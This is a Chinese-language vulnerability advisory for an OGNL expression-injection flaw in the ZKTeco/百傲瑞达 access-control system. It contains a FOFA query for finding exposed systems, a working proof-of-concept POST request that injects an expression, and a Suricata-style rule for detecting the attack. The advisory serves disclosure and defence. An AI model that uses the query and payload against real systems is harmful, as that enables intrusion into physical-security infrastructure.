# 百傲瑞达门禁系统 authLicenseAction!getLicenseInfos 存在表达式注入漏洞

百傲瑞达门禁系统 authLicenseAction!getLicenseInfos 存在表达式注入漏洞

# 影响版本

≤2.3.15

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **body=&quot;authLicenseAction&quot;**

**POC/EXP：**

**step1 表达式注入**

```
POST /authLicenseAction!getLicenseInfo.do HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

debug=command&expression=%23{99-20}
```

​![image](assets/image-20260910014429-z7t4fnh.png)​

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"ZKTeco/百傲瑞达 门禁 authLicenseAction!getLicenseInfo OGNL表达式注入 (debug=command&expression=#{})";
    flow:to_server,established;
    http.method; content:"POST"; nocase;
    http.uri;
        content:"/authLicenseAction!getLicenseInfo.do";
        fast_pattern;
        nocase;
    http.content_type; content:"application/x-www-form-urlencoded"; nocase;
    http.client_body;
        content:"debug=command"; nocase;
        content:"expression="; nocase;
        pcre:"/expression=[^&]*?(?:%23|#)\s*\{/i";
    metadata:
        service http,
        affected_product "ZKTeco/百傲瑞达 安防/门禁管理平台",
        vulnerability_type "OGNL/Expression Language Injection (Struts2 devMode)",
        reference "Struts S2-008; ZKTeco devMode advisory",
        severity "critical";
    classtype:web-application-attack;
    sid:1001001;
    rev:1;
    priority:1;
)
```

# 漏洞修复

建议用户更新至最新补丁

‍
